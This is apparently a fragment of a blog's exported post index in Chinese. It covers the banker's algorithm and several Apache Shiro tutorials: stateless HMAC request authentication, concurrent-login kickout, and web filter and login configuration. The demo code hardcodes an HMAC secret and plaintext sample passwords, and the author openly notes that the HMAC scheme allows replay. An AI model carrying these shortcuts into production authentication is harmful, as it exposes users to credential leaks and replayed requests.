定义：如果没有死锁发生，并且即使所有进程突然请求对资源的最大需求，也仍然存在某种调度次序能够使得每一个进程运行完毕，则称该状态是安全的。 安全状态的检测与死锁的检测类似，因为安全状态必须要求不能发生死锁。下面的银行家算法与死锁检测算法非常类似，可以结合着做参考对比。 2. 单个资源的银行家算法一个小城镇的银行家，他向一群客户分别承诺了一定的贷款额度，算法要做的是判断对请求的满足是否会进入不安全状态，如果是，就拒绝请求；否则予以分配。 上图 c 为不安全状态，因此算法会拒绝之前的请求，从而避免进入图 c 中的状态。 3. 多个资源的银行家算法 上图中有五个进程，四个资源。左边的图表示已经分配的资源，右边的图表示还需要分配的资源。最右边的 E、P 以及 A 分别表示：总资源、已分配资源以及可用资源，注意这三个为向量，而不是具体数值，例如 A=(1020)，表示 4 个资源分别还剩下 1/0/2/0。 检查一个状态是否安全的算法如下： 查找右边的矩阵是否存在一行小于等于向量 A。如果不存在这样的行，那么系统将会发生死锁，状态是不安全的。 假若找到这样一行，将该进程标记为终止，并将其已分配资源加到 A 中。 重复以上两步，直到所有进程都标记为终止，则状态时安全的。 如果一个状态不是安全的，需要拒绝进入这个状态。]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>计算机操作系统</tag>
        <tag>死锁</tag>
        <tag>银行家算法</tag>
        <tag>鸵鸟算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[无状态Web应用集成]]></title>
    <url>%2F2018%2F11%2F13%2F%E6%97%A0%E7%8A%B6%E6%80%81Web%E5%BA%94%E7%94%A8%E9%9B%86%E6%88%90%2F</url>
    <content type="text"><![CDATA[无状态 Web 应用集成在一些环境中，可能需要把 Web 应用做成无状态的，即服务器端无状态，就是说服务器端不会存储像会话这种东西，而是每次请求时带上相应的用户名进行登录。如一些 REST 风格的 API，如果不使用 OAuth2 协议，就可以使用如 REST+HMAC 认证进行访问。HMAC（Hash-based Message Authentication Code）：基于散列的消息认证码，使用一个密钥和一个消息作为输入，生成它们的消息摘要。注意该密钥只有客户端和服务端知道，其他第三方是不知道的。访问时使用该消息摘要进行传播，服务端然后对该消息摘要进行验证。如果只传递用户名 + 密码的消息摘要，一旦被别人捕获可能会重复使用该摘要进行认证。解决办法如： 每次客户端申请一个 Token，然后使用该 Token 进行加密，而该 Token 是一次性的，即只能用一次；有点类似于 OAuth2 的 Token 机制，但是简单些； 客户端每次生成一个唯一的 Token，然后使用该 Token 加密，这样服务器端记录下这些 Token，如果之前用过就认为是非法请求。 为了简单，本文直接对请求的数据（即全部请求的参数）生成消息摘要，即无法篡改数据，但是可能被别人窃取而能多次调用。解决办法如上所示。 服务器端对于服务器端，不生成会话，而是每次请求时带上用户身份进行认证。 服务控制器1234567@RestControllerpublic class ServiceController &#123; @RequestMapping(&quot;/hello&quot;) public String hello1(String[] param1, String param2) &#123; return &quot;hello&quot; + param1[0] + param1[1] + param2; &#125;&#125;&amp;nbsp; 当访问 / hello 服务时，需要传入 param1、param2 两个请求参数。 加密工具类com.github.zhangkaitao.shiro.chapter20.codec.HmacSHA256Utils： 1234//使用指定的密码对内容生成消息摘要（散列值）public static String digest(String key, String content);//使用指定的密码对整个Map的内容生成消息摘要（散列值）public static String digest(String key, Map&lt;String, ?&gt; map)&amp;nbsp; 对 Map 生成消息摘要主要用于对客户端 / 服务器端来回传递的参数生成消息摘要。 Subject 工厂1234567public class StatelessDefaultSubjectFactory extends DefaultWebSubjectFactory &#123; public Subject createSubject(SubjectContext context) &#123; //不创建session context.setSessionCreationEnabled(false); return super.createSubject(context); &#125;&#125;&amp;nbsp; 通过调用 context.setSessionCreationEnabled(false) 表示不创建会话；如果之后调用 Subject.getSession() 将抛出 DisabledSessionException 异常。 StatelessAuthcFilter类似于 FormAuthenticationFilter，但是根据当前请求上下文信息每次请求时都要登录的认证过滤器。 123456789101112131415161718192021222324252627282930313233public class StatelessAuthcFilter extends AccessControlFilter &#123; protected boolean isAccessAllowed(ServletRequest request, ServletResponse response, Object mappedValue) throws Exception &#123; return false; &#125; protected boolean onAccessDenied(ServletRequest request, ServletResponse response) throws Exception &#123; //1、客户端生成的消息摘要 String clientDigest = request.getParameter(Constants.PARAM_DIGEST); //2、客户端传入的用户身份String username = request.getParameter(Constants.PARAM_USERNAME); //3、客户端请求的参数列表 Map&lt;String, String[]&gt; params = new HashMap&lt;String, String[]&gt;(request.getParameterMap()); params.remove(Constants.PARAM_DIGEST); //4、生成无状态Token StatelessToken token = new StatelessToken(username, params, clientDigest); try &#123; //5、委托给Realm进行登录 getSubject(request, response).login(token); &#125; catch (Exception e) &#123; e.printStackTrace(); onLoginFail(response); //6、登录失败 return false; &#125; return true; &#125; //登录失败时默认返回401状态码 private void onLoginFail(ServletResponse response) throws IOException &#123; HttpServletResponse httpResponse = (HttpServletResponse) response; httpResponse.setStatus(HttpServletResponse.SC_UNAUTHORIZED); httpResponse.getWriter().write(&quot;login error&quot;); &#125;&#125;&amp;nbsp; 获取客户端传入的用户名、请求参数、消息摘要，生成 StatelessToken；然后交给相应的 Realm 进行认证。 StatelessToken12345678public class StatelessToken implements AuthenticationToken &#123; private String username; private Map&lt;String, ?&gt; params; private String clientDigest; //省略部分代码 public Object getPrincipal() &#123; return username;&#125; public Object getCredentials() &#123; return clientDigest;&#125;&#125;&amp;nbsp; 用户身份即用户名；凭证即客户端传入的消息摘要。 StatelessRealm用于认证的 Realm。 12345678910111213141516171819202122232425262728293031public class StatelessRealm extends AuthorizingRealm &#123; public boolean supports(AuthenticationToken token) &#123; //仅支持StatelessToken类型的Token return token instanceof StatelessToken; &#125; protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principals) &#123; //根据用户名查找角色，请根据需求实现 String username = (String) principals.getPrimaryPrincipal(); SimpleAuthorizationInfo authorizationInfo = new SimpleAuthorizationInfo(); authorizationInfo.addRole(&quot;admin&quot;); return authorizationInfo; &#125; protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) throws AuthenticationException &#123; StatelessToken statelessToken = (StatelessToken) token; String username = statelessToken.getUsername(); String key = getKey(username);//根据用户名获取密钥（和客户端的一样） //在服务器端生成客户端参数消息摘要 String serverDigest = HmacSHA256Utils.digest(key, statelessToken.getParams()); //然后进行客户端消息摘要和服务器端消息摘要的匹配 return new SimpleAuthenticationInfo( username, serverDigest, getName()); &#125; private String getKey(String username) &#123;//得到密钥，此处硬编码一个 if(&quot;admin&quot;.equals(username)) &#123; return &quot;dadadswdewq2ewdwqdwadsadasd&quot;; &#125; return null; &#125;&#125;&amp;nbsp; 此处首先根据客户端传入的用户名获取相应的密钥，然后使用密钥对请求参数生成服务器端的消息摘要；然后与客户端的消息摘要进行匹配；如果匹配说明是合法客户端传入的；否则是非法的。这种方式是有漏洞的，一旦别人获取到该请求，可以重复请求；可以考虑之前介绍的解决方案。 Spring 配置——spring-config-shiro.xml1234567891011121314151617181920212223242526&lt;!-- Realm实现 --&gt;&lt;bean id=&quot;statelessRealm&quot; class=&quot;com.github.zhangkaitao.shiro.chapter20.realm.StatelessRealm&quot;&gt; &lt;property name=&quot;cachingEnabled&quot; value=&quot;false&quot;/&gt;&lt;/bean&gt;&lt;!-- Subject工厂 --&gt;&lt;bean id=&quot;subjectFactory&quot; class=&quot;com.github.zhangkaitao.shiro.chapter20.mgt.StatelessDefaultSubjectFactory&quot;/&gt;&lt;!-- 会话管理器 --&gt;&lt;bean id=&quot;sessionManager&quot; class=&quot;org.apache.shiro.session.mgt.DefaultSessionManager&quot;&gt; &lt;property name=&quot;sessionValidationSchedulerEnabled&quot; value=&quot;false&quot;/&gt;&lt;/bean&gt;&lt;!-- 安全管理器 --&gt;&lt;bean id=&quot;securityManager&quot; class=&quot;org.apache.shiro.web.mgt.DefaultWebSecurityManager&quot;&gt; &lt;property name=&quot;realm&quot; ref=&quot;statelessRealm&quot;/&gt; &lt;property name=&quot;subjectDAO.sessionStorageEvaluator.sessionStorageEnabled&quot; value=&quot;false&quot;/&gt; &lt;property name=&quot;subjectFactory&quot; ref=&quot;subjectFactory&quot;/&gt; &lt;property name=&quot;sessionManager&quot; ref=&quot;sessionManager&quot;/&gt;&lt;/bean&gt;&lt;!-- 相当于调用SecurityUtils.setSecurityManager(securityManager) --&gt;&lt;bean class=&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot;&gt; &lt;property name=&quot;staticMethod&quot; value=&quot;org.apache.shiro.SecurityUtils.setSecurityManager&quot;/&gt; &lt;property name=&quot;arguments&quot; ref=&quot;securityManager&quot;/&gt;&lt;/bean&gt;&amp;nbsp; sessionManager 通过 sessionValidationSchedulerEnabled 禁用掉会话调度器，因为我们禁用掉了会话，所以没必要再定期过期会话了。 12&lt;bean id=&quot;statelessAuthcFilter&quot; class=&quot;com.github.zhangkaitao.shiro.chapter20.filter.StatelessAuthcFilter&quot;/&gt;&amp;nbsp; 每次请求进行认证的拦截器。 12345678910111213&lt;bean id=&quot;shiroFilter&quot; class=&quot;org.apache.shiro.spring.web.ShiroFilterFactoryBean&quot;&gt; &lt;property name=&quot;securityManager&quot; ref=&quot;securityManager&quot;/&gt; &lt;property name=&quot;filters&quot;&gt; &lt;util:map&gt; &lt;entry key=&quot;statelessAuthc&quot; value-ref=&quot;statelessAuthcFilter&quot;/&gt; &lt;/util:map&gt; &lt;/property&gt; &lt;property name=&quot;filterChainDefinitions&quot;&gt; &lt;value&gt; /**=statelessAuthc &lt;/value&gt; &lt;/property&gt;&lt;/bean&gt;&amp;nbsp; 所有请求都将走 statelessAuthc 拦截器进行认证。 其他配置请参考源代码。 SpringMVC 学习请参考：5 分钟构建 spring web mvc REST 风格 HelloWorldhttp://jinnianshilongnian.iteye.com/blog/1996071跟我学 SpringMVChttp://www.iteye.com/blogs/subjects/kaitao-springmvc 客户端此处使用 SpringMVC 提供的 RestTemplate 进行测试。请参考如下文章进行学习：Spring MVC 测试框架详解——客户端测试http://jinnianshilongnian.iteye.com/blog/2007180Spring MVC 测试框架详解——服务端测试http://jinnianshilongnian.iteye.com/blog/2004660 此处为了方便，使用内嵌 jetty 服务器启动服务端： 123456789101112131415161718192021public class ClientTest &#123; private static Server server; private RestTemplate restTemplate = new RestTemplate(); @BeforeClass public static void beforeClass() throws Exception &#123; //创建一个server server = new Server(8080); WebAppContext context = new WebAppContext(); String webapp = &quot;shiro-example-chapter20/src/main/webapp&quot;; context.setDescriptor(webapp + &quot;/WEB-INF/web.xml&quot;); //指定web.xml配置文件 context.setResourceBase(webapp); //指定webapp目录 context.setContextPath(&quot;/&quot;); context.setParentLoaderPriority(true); server.setHandler(context); server.start(); &#125; @AfterClass public static void afterClass() throws Exception &#123; server.stop(); //当测试结束时停止服务器 &#125;&#125;&amp;nbsp; 在整个测试开始之前开启服务器，整个测试结束时关闭服务器。 测试成功情况 12345678910111213141516171819@Testpublic void testServiceHelloSuccess() &#123; String username = &quot;admin&quot;; String param11 = &quot;param11&quot;; String param12 = &quot;param12&quot;; String param2 = &quot;param2&quot;; String key = &quot;dadadswdewq2ewdwqdwadsadasd&quot;; MultiValueMap&lt;String, String&gt; params = new LinkedMultiValueMap&lt;String, String&gt;(); params.add(Constants.PARAM_USERNAME, username); params.add(&quot;param1&quot;, param11); params.add(&quot;param1&quot;, param12); params.add(&quot;param2&quot;, param2); params.add(Constants.PARAM_DIGEST, HmacSHA256Utils.digest(key, params)); String url = UriComponentsBuilder .fromHttpUrl(&quot;http://localhost:8080/hello&quot;) .queryParams(params).build().toUriString(); ResponseEntity responseEntity = restTemplate.getForEntity(url, String.class); Assert.assertEquals(&quot;hello&quot; + param11 + param12 + param2, responseEntity.getBody());&#125;&amp;nbsp; 对请求参数生成消息摘要后带到参数中传递给服务器端，服务器端验证通过后访问相应服务，然后返回数据。 测试失败情况 123456789101112131415161718192021222324@Testpublic void testServiceHelloFail() &#123; String username = &quot;admin&quot;; String param11 = &quot;param11&quot;; String param12 = &quot;param12&quot;; String param2 = &quot;param2&quot;; String key = &quot;dadadswdewq2ewdwqdwadsadasd&quot;; MultiValueMap&lt;String, String&gt; params = new LinkedMultiValueMap&lt;String, String&gt;(); params.add(Constants.PARAM_USERNAME, username); params.add(&quot;param1&quot;, param11); params.add(&quot;param1&quot;, param12); params.add(&quot;param2&quot;, param2); params.add(Constants.PARAM_DIGEST, HmacSHA256Utils.digest(key, params)); params.set(&quot;param2&quot;, param2 + &quot;1&quot;); String url = UriComponentsBuilder .fromHttpUrl(&quot;http://localhost:8080/hello&quot;) .queryParams(params).build().toUriString(); try &#123; ResponseEntity responseEntity = restTemplate.getForEntity(url, String.class); &#125; catch (HttpClientErrorException e) &#123; Assert.assertEquals(HttpStatus.UNAUTHORIZED, e.getStatusCode()); Assert.assertEquals(&quot;login error&quot;, e.getResponseBodyAsString()); &#125;&#125;&amp;nbsp; 在生成请求参数消息摘要后，篡改了参数内容，服务器端接收后进行重新生成消息摘要发现不一样，报 401 错误状态码。]]></content>
      <categories>
        <category>shiro</category>
      </categories>
      <tags>
        <tag>权限验证</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[并发登陆人数控制]]></title>
    <url>%2F2018%2F11%2F13%2F%E5%B9%B6%E5%8F%91%E7%99%BB%E9%99%86%E4%BA%BA%E6%95%B0%E6%8E%A7%E5%88%B6%2F</url>
    <content type="text"><![CDATA[并发登录人数控制在某些项目中可能会遇到如每个账户同时只能有一个人登录或几个人同时登录，如果同时有多人登录：要么不让后者登录；要么踢出前者登录（强制退出）。比如 spring security 就直接提供了相应的功能；Shiro 的话没有提供默认实现，不过可以很容易的在 Shiro 中加入这个功能。 示例代码基于《第十六章 综合实例》完成，通过 Shiro Filter 机制扩展 KickoutSessionControlFilter 完成。 首先来看看如何配置使用（spring-config-shiro.xml） kickoutSessionControlFilter 用于控制并发登录人数的 12345678&lt;bean id=&quot;kickoutSessionControlFilter&quot; class=&quot;com.github.zhangkaitao.shiro.chapter18.web.shiro.filter.KickoutSessionControlFilter&quot;&gt; &lt;property name=&quot;cacheManager&quot; ref=&quot;cacheManager&quot;/&gt; &lt;property name=&quot;sessionManager&quot; ref=&quot;sessionManager&quot;/&gt; &lt;property name=&quot;kickoutAfter&quot; value=&quot;false&quot;/&gt; &lt;property name=&quot;maxSession&quot; value=&quot;2&quot;/&gt; &lt;property name=&quot;kickoutUrl&quot; value=&quot;/login?kickout=1&quot;/&gt;&lt;/bean&gt;&amp;nbsp; cacheManager：使用 cacheManager 获取相应的 cache 来缓存用户登录的会话；用于保存用户—会话之间的关系的； sessionManager：用于根据会话 ID，获取会话进行踢出操作的； kickoutAfter：是否踢出后来登录的，默认是 false；即后者登录的用户踢出前者登录的用户； maxSession：同一个用户最大的会话数，默认 1；比如 2 的意思是同一个用户允许最多同时两个人登录； kickoutUrl：被踢出后重定向到的地址； shiroFilter 配置 12345678910111213141516171819&lt;bean id=&quot;shiroFilter&quot; class=&quot;org.apache.shiro.spring.web.ShiroFilterFactoryBean&quot;&gt; &lt;property name=&quot;securityManager&quot; ref=&quot;securityManager&quot;/&gt; &lt;property name=&quot;loginUrl&quot; value=&quot;/login&quot;/&gt; &lt;property name=&quot;filters&quot;&gt; &lt;util:map&gt; &lt;entry key=&quot;authc&quot; value-ref=&quot;formAuthenticationFilter&quot;/&gt; &lt;entry key=&quot;sysUser&quot; value-ref=&quot;sysUserFilter&quot;/&gt; &lt;entry key=&quot;kickout&quot; value-ref=&quot;kickoutSessionControlFilter&quot;/&gt; &lt;/util:map&gt; &lt;/property&gt; &lt;property name=&quot;filterChainDefinitions&quot;&gt; &lt;value&gt; /login = authc /logout = logout /authenticated = authc /** = kickout,user,sysUser &lt;/value&gt; &lt;/property&gt; &lt;/bean&gt;&amp;nbsp; 此处配置除了登录等之外的地址都走 kickout 拦截器进行并发登录控制。 测试 此处因为 maxSession=2，所以需要打开 3 个浏览器（需要不同的浏览器，如 IE、Chrome、Firefox），分别访问 http://localhost:8080/chapter18/ 进行登录；然后刷新第一次打开的浏览器，将会被强制退出，如显示下图： KickoutSessionControlFilter 核心代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950protected boolean onAccessDenied(ServletRequest request, ServletResponse response) throws Exception &#123; Subject subject = getSubject(request, response); if(!subject.isAuthenticated() &amp;&amp; !subject.isRemembered()) &#123; //如果没有登录，直接进行之后的流程 return true; &#125; Session session = subject.getSession(); String username = (String) subject.getPrincipal(); Serializable sessionId = session.getId(); //TODO 同步控制 Deque&lt;Serializable&gt; deque = cache.get(username); if(deque == null) &#123; deque = new LinkedList&lt;Serializable&gt;(); cache.put(username, deque); &#125; //如果队列里没有此sessionId，且用户没有被踢出；放入队列 if(!deque.contains(sessionId) &amp;&amp; session.getAttribute(&quot;kickout&quot;) == null) &#123; deque.push(sessionId); &#125; //如果队列里的sessionId数超出最大会话数，开始踢人 while(deque.size() &gt; maxSession) &#123; Serializable kickoutSessionId = null; if(kickoutAfter) &#123; //如果踢出后者 kickoutSessionId = deque.removeFirst(); &#125; else &#123; //否则踢出前者 kickoutSessionId = deque.removeLast(); &#125; try &#123; Session kickoutSession = sessionManager.getSession(new DefaultSessionKey(kickoutSessionId)); if(kickoutSession != null) &#123; //设置会话的kickout属性表示踢出了 kickoutSession.setAttribute(&quot;kickout&quot;, true); &#125; &#125; catch (Exception e) &#123;//ignore exception &#125; &#125; //如果被踢出了，直接退出，重定向到踢出后的地址 if (session.getAttribute(&quot;kickout&quot;) != null) &#123; //会话被踢出了 try &#123; subject.logout(); &#125; catch (Exception e) &#123; //ignore &#125; saveRequest(request); WebUtils.issueRedirect(request, response, kickoutUrl); return false; &#125; return true;&#125;&amp;nbsp; 此处使用了 Cache 缓存用户名—会话 id 之间的关系；如果量比较大可以考虑如持久化到数据库 / 其他带持久化的 Cache 中；另外此处没有并发控制的同步实现，可以考虑根据用户名获取锁来控制，减少锁的粒度。]]></content>
      <categories>
        <category>shiro</category>
      </categories>
      <tags>
        <tag>权限验证</tag>
        <tag>并发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web集成shiro]]></title>
    <url>%2F2018%2F11%2F13%2Fweb%E9%9B%86%E6%88%90shiro%2F</url>
    <content type="text"><![CDATA[与 Web 集成Shiro 提供了与 Web 集成的支持，其通过一个 ShiroFilter 入口来拦截需要安全控制的 URL，然后进行相应的控制，ShiroFilter 类似于如 Strut2/SpringMVC 这种 web 框架的前端控制器，其是安全控制的入口点，其负责读取配置（如 ini 配置文件），然后判断 URL 是否需要登录 / 权限等工作。 准备环境1、创建 webapp 应用 此处我们使用了 jetty-maven-plugin 和 tomcat7-maven-plugin 插件；这样可以直接使用 “mvn jetty:run” 或“mvn tomcat7:run”直接运行 webapp 了。然后通过 URLhttp://localhost:8080/chapter7 / 访问即可。 2、依赖 Servlet3 123456&lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt; &lt;version&gt;3.0.1&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt;&lt;/dependency&gt;&amp;nbsp; Servlet3 的知识可以参考 https://github.com/zhangkaitao/servlet3-showcase 及 Servlet3 规范 http://www.iteye.com/blogs/subjects/Servlet-3-1。 shiro-web 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt; &lt;artifactId&gt;shiro-web&lt;/artifactId&gt; &lt;version&gt;1.2.2&lt;/version&gt;&lt;/dependency&gt;&amp;nbsp; 其他依赖请参考源码的 pom.xml。 ShiroFilter 入口1、Shiro 1.1 及以前版本配置方式 123456789101112&lt;filter&gt; &lt;filter-name&gt;iniShiroFilter&lt;/filter-name&gt; &lt;filter-class&gt;org.apache.shiro.web.servlet.IniShiroFilter&lt;/filter-class&gt; &lt;init-param&gt; &lt;param-name&gt;configPath&lt;/param-name&gt; &lt;param-value&gt;classpath:shiro.ini&lt;/param-value&gt; &lt;/init-param&gt;&lt;/filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;iniShiroFilter&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt;&amp;nbsp; 使用 IniShiroFilter 作为 Shiro 安全控制的入口点，通过 url-pattern 指定需要安全的 URL； 通过 configPath 指定 ini 配置文件位置，默认是先从 /WEB-INF/shiro.ini 加载，如果没有就默认加载 classpath:shiro.ini，即默认相对于 web 应用上下文根路径； 也可以通过如下方式直接内嵌 ini 配置文件内容到 web.xml。 123456&lt;init-param&gt; &lt;param-name&gt;config&lt;/param-name&gt; &lt;param-value&gt; ini配置文件贴在这 &lt;/param-value&gt;&lt;/init-param&gt; 2、Shiro 1.2 及以后版本的配置方式 从 Shiro 1.2 开始引入了 Environment/WebEnvironment 的概念，即由它们的实现提供相应的 SecurityManager 及其相应的依赖。ShiroFilter 会自动找到 Environment 然后获取相应的依赖。 123&lt;listener&gt; &lt;listener-class&gt;org.apache.shiro.web.env.EnvironmentLoaderListener&lt;/listener-class&gt;&lt;/listener&gt;&amp;nbsp; 通过 EnvironmentLoaderListener 来创建相应的 WebEnvironment，并自动绑定到 ServletContext，默认使用 IniWebEnvironment 实现。 可以通过如下配置修改默认实现及其加载的配置文件位置： 12345678&lt;context-param&gt; &lt;param-name&gt;shiroEnvironmentClass&lt;/param-name&gt; &lt;param-value&gt;org.apache.shiro.web.env.IniWebEnvironment&lt;/param-value&gt;&lt;/context-param&gt; &lt;context-param&gt; &lt;param-name&gt;shiroConfigLocations&lt;/param-name&gt; &lt;param-value&gt;classpath:shiro.ini&lt;/param-value&gt; &lt;/context-param&gt;&amp;nbsp; shiroConfigLocations 默认是 “/WEB-INF/shiro.ini”，IniWebEnvironment 默认是先从 / WEB-INF/shiro.ini 加载，如果没有就默认加载 classpath:shiro.ini。 3、与 Spring 集成 123456789101112&lt;filter&gt; &lt;filter-name&gt;shiroFilter&lt;/filter-name&gt; &lt;filter-class&gt;org.springframework.web.filter.DelegatingFilterProxy&lt;/filter-class&gt; &lt;init-param&gt; &lt;param-name&gt;targetFilterLifecycle&lt;/param-name&gt; &lt;param-value&gt;true&lt;/param-value&gt; &lt;/init-param&gt;&lt;/filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;shiroFilter&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt;&amp;nbsp; DelegatingFilterProxy 作用是自动到 spring 容器查找名字为 shiroFilter（filter-name）的 bean 并把所有 Filter 的操作委托给它。然后将 ShiroFilter 配置到 spring 容器即可： 1234&lt;bean id=&quot;shiroFilter&quot; class=&quot;org.apache.shiro.spring.web.ShiroFilterFactoryBean&quot;&gt;&lt;property name=&quot;securityManager&quot; ref=&quot;securityManager&quot;/&gt;&lt;!—忽略其他，详见与Spring集成部分 --&gt;&lt;/bean&gt;&amp;nbsp; 最后不要忘了使用 org.springframework.web.context.ContextLoaderListener 加载这个 spring 配置文件即可。 因为我们现在的 shiro 版本是 1.2 的，因此之后的测试都是使用 1.2 的配置。 Web INI 配置ini 配置部分和之前的相比将多出对 url 部分的配置。 1234567891011121314151617[main]\#默认是/login.jspauthc.loginUrl=/loginroles.unauthorizedUrl=/unauthorizedperms.unauthorizedUrl=/unauthorized[users]zhang=123,adminwang=123[roles]admin=user:*,menu:*[urls]/login=anon/unauthorized=anon/static/**=anon/authenticated=authc/role=authc,roles[admin]/permission=authc,perms[&quot;user:create&quot;]&amp;nbsp; 其中最重要的就是 [urls] 部分的配置，其格式是： “url = 拦截器 [参数]，拦截器[参数]”；即如果当前请求的 url 匹配[urls] 部分的某个 url 模式，将会执行其配置的拦截器。比如 anon 拦截器表示匿名访问（即不需要登录即可访问）；authc 拦截器表示需要身份认证通过后才能访问；roles[admin]拦截器表示需要有 admin 角色授权才能访问；而 perms[“user:create”]拦截器表示需要有 “user:create” 权限才能访问。 url 模式使用 Ant 风格模式Ant 路径通配符支持?、、，注意通配符匹配不包括目录分隔符 “/”：?：匹配一个字符，如”/admin?” 将匹配 / admin1，但不匹配 / admin 或 / admin2；\：匹配零个或多个字符串，如 / admin * 将匹配 / admin、/admin123，但不匹配 / admin/1；\\：匹配路径中的零个或多个路径，如 / admin/ 将匹配 / admin/a 或 / admin/a/b。 url 模式匹配顺序 url 模式匹配顺序是按照在配置中的声明顺序匹配，即从头开始使用第一个匹配的 url 模式对应的拦截器链。如： 123/bb/**=filter1/bb/aa=filter2/**=filter3&amp;nbsp; 如果请求的 url 是 “/bb/aa”，因为按照声明顺序进行匹配，那么将使用 filter1 进行拦截。 拦截器将在下一节详细介绍。接着我们来看看身份验证、授权及退出在 web 中如何实现。 身份验证（登录）首先配置需要身份验证的 url 123/authenticated=authc/role=authc,roles[admin]/permission=authc,perms[&quot;user:create&quot;]&amp;nbsp; 即访问这些地址时会首先判断用户有没有登录，如果没有登录默会跳转到登录页面，默认是 / login.jsp，可以通过在 [main] 部分通过如下配置修改： 1authc.loginUrl=/login 登录 Servlet（com.github.zhangkaitao.shiro.chapter7.web.servlet.LoginServlet） 123456789101112131415161718192021222324252627282930313233@WebServlet(name = &quot;loginServlet&quot;, urlPatterns = &quot;/login&quot;)public class LoginServlet extends HttpServlet &#123; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; req.getRequestDispatcher(&quot;/WEB-INF/jsp/login.jsp&quot;).forward(req, resp); &#125; @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; String error = null; String username = req.getParameter(&quot;username&quot;); String password = req.getParameter(&quot;password&quot;); Subject subject = SecurityUtils.getSubject(); UsernamePasswordToken token = new UsernamePasswordToken(username, password); try &#123; subject.login(token); &#125; catch (UnknownAccountException e) &#123; error = &quot;用户名/密码错误&quot;; &#125; catch (IncorrectCredentialsException e) &#123; error = &quot;用户名/密码错误&quot;; &#125; catch (AuthenticationException e) &#123; //其他错误，比如锁定，如果想单独处理请单独catch处理 error = &quot;其他错误：&quot; + e.getMessage(); &#125; if(error != null) &#123;//出错了，返回登录页面 req.setAttribute(&quot;error&quot;, error); req.getRequestDispatcher(&quot;/WEB-INF/jsp/login.jsp&quot;).forward(req, resp); &#125; else &#123;//登录成功 req.getRequestDispatcher(&quot;/WEB-INF/jsp/loginSuccess.jsp&quot;).forward(req, resp); &#125; &#125;&#125;&amp;nbsp; doGet 请求时展示登录页面； doPost 时进行登录，登录时收集 username/password 参数，然后提交给 Subject 进行登录。如果有错误再返回到登录页面；否则跳转到登录成功页面（此处应该返回到访问登录页面之前的那个页面，或者没有上一个页面时访问主页）。 JSP 页面请参考源码。 测试 首先输入 http://localhost:8080/chapter7/login 进行登录，登录成功后接着可以访问 http://localhost:8080/chapter7/authenticated 来显示当前登录的用户： 1$&#123;subject.principal&#125; 身份验证已通过。 当前实现的一个缺点就是，永远返回到同一个成功页面（比如首页），在实际项目中比如支付时如果没有登录将跳转到登录页面，登录成功后再跳回到支付页面；对于这种功能大家可以在登录时把当前请求保存下来，然后登录成功后再重定向到该请求即可。 Shiro 内置了登录（身份验证）的实现：基于表单的和基于 Basic 的验证，其通过拦截器实现。 基于 Basic 的拦截器身份验证shiro-basicfilterlogin.ini 配置 12345[main]authcBasic.applicationName=please login………省略users[urls]/role=authcBasic,roles[admin]&amp;nbsp; 1、authcBasic 是 org.apache.shiro.web.filter.authc.BasicHttpAuthenticationFilter 类型的实例，其用于实现基于 Basic 的身份验证；applicationName 用于弹出的登录框显示信息使用，如图： 2、[urls] 部分配置了 /role 地址需要走 authcBasic 拦截器，即如果访问 /role 时还没有通过身份验证那么将弹出如上图的对话框进行登录，登录成功即可访问。 web.xml 把 shiroConfigLocations 改为 shiro-basicfilterlogin.ini 即可。 测试 输入 http://localhost:8080/chapter7/role，会弹出之前的 Basic 验证对话框输入 “zhang/123” 即可登录成功进行访问。 基于表单的拦截器身份验证基于表单的拦截器身份验证和【1】类似，但是更简单，因为其已经实现了大部分登录逻辑；我们只需要指定：登录地址 / 登录失败后错误信息存哪 / 成功的地址即可。 shiro-formfilterlogin.ini 12345678[main]authc.loginUrl=/formfilterloginauthc.usernameParam=usernameauthc.passwordParam=passwordauthc.successUrl=/authc.failureKeyAttribute=shiroLoginFailure[urls]/role=authc,roles[admin]&amp;nbsp; 1、authc 是 org.apache.shiro.web.filter.authc.FormAuthenticationFilter 类型的实例，其用于实现基于表单的身份验证；通过 loginUrl 指定当身份验证时的登录表单；usernameParam 指定登录表单提交的用户名参数名；passwordParam 指定登录表单提交的密码参数名；successUrl 指定登录成功后重定向的默认地址（默认是 “/”）（如果有上一个地址会自动重定向带该地址）；failureKeyAttribute 指定登录失败时的 request 属性 key（默认 shiroLoginFailure）；这样可以在登录表单得到该错误 key 显示相应的错误消息； web.xml 把 shiroConfigLocations 改为 shiro-formfilterlogin.ini 即可。 登录 Servlet 123456789101112131415161718192021@WebServlet(name = &quot;formFilterLoginServlet&quot;, urlPatterns = &quot;/formfilterlogin&quot;)public class FormFilterLoginServlet extends HttpServlet &#123; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; doPost(req, resp); &#125; @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; String errorClassName = (String)req.getAttribute(&quot;shiroLoginFailure&quot;); if(UnknownAccountException.class.getName().equals(errorClassName)) &#123; req.setAttribute(&quot;error&quot;, &quot;用户名/密码错误&quot;); &#125; else if(IncorrectCredentialsException.class.getName().equals(errorClassName)) &#123; req.setAttribute(&quot;error&quot;, &quot;用户名/密码错误&quot;); &#125; else if(errorClassName != null) &#123; req.setAttribute(&quot;error&quot;, &quot;未知错误：&quot; + errorClassName); &#125; req.getRequestDispatcher(&quot;/WEB-INF/jsp/formfilterlogin.jsp&quot;).forward(req, resp); &#125;&#125; 